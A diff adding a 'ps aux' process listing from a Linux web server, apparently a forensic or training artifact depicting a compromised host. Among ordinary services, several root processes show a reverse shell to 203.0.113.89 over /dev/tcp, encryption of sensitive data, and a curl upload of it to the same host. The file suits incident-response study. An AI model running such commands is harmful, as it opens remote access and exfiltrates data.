@@ -1,0 +1,22 @@
+USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
+root         1  0.0  0.1 169436 11468 ?        Ss   Mar14   0:03 /sbin/init
+root        42  0.0  0.0  47748  7264 ?        S    Mar14   0:00 /usr/lib/systemd/systemd-journald
+root        71  0.0  0.0  21976  5504 ?        Ss   Mar14   0:00 /usr/lib/systemd/systemd-udevd
+systemd+   142  0.0  0.0  90268  6160 ?        Ssl  Mar14   0:01 /usr/lib/systemd/systemd-timesyncd
+root       168  0.0  0.0  15420  7488 ?        Ss   Mar14   0:00 /usr/sbin/sshd -D
+root       175  0.0  0.0 236436  9064 ?        Ssl  Mar14   0:02 /usr/sbin/rsyslogd -n
+root       178  0.0  0.0   6816  2940 ?        Ss   Mar14   0:00 /usr/sbin/cron -f
+root       185  0.0  0.1 157580 15616 ?        Ss   Mar14   0:01 /usr/sbin/apache2 -k start
+www-data   312  0.0  0.1 158020 12288 ?        S    Mar14   0:08 /usr/sbin/apache2 -k start
+www-data   313  0.0  0.1 158020 12288 ?        S    Mar14   0:08 /usr/sbin/apache2 -k start
+www-data   314  0.0  0.1 157892 10240 ?        S    Mar14   0:06 /usr/sbin/apache2 -k start
+www-data   315  0.0  0.1 157892 10240 ?        S    Mar14   0:05 /usr/sbin/apache2 -k start
+www-data   316  0.0  0.1 157892 10240 ?        S    Mar14   0:04 /usr/sbin/apache2 -k start
+root       445  0.0  0.0  27392  3072 ?        Ss   Mar14   0:00 /usr/sbin/vsftpd /etc/vsftpd.conf
+devops     502  0.0  0.0  18964  3328 ?        S    14:31   0:00 su devops
+root       620  0.0  0.0   4628   784 ?        S    14:38   0:00 /bin/bash -i
+root       789  0.1  0.0   7240  3456 ?        S    14:45   0:00 /bin/bash -c /bin/bash -i >& /dev/tcp/203.0.113.89/4444 0>&1
+root       823  0.0  0.0  38892  4096 pts/0    S+   15:02   0:00 python3 /tmp/encrypt_tool.py --mode encrypt --seed pr0j3ct_m4yh3m_2024 --input /tmp/sensitive_data.tar.gz --output /tmp/encrypted_exfil.bin
+root       851  0.0  0.0   7684  2560 pts/0    S+   15:05   0:00 curl -s -X POST -F file=@/tmp/encrypted_exfil.bin http://203.0.113.89:8080/upload
+root       890  0.0  0.0   8536  3200 ?        Rs   15:08   0:00 ps aux
+root       923  0.0  0.1  48256  8192 ?        S    Mar14   0:15 python3 /opt/monitoring/datadog-agent.py --api-key=redacted --site=us5.datadoghq.com
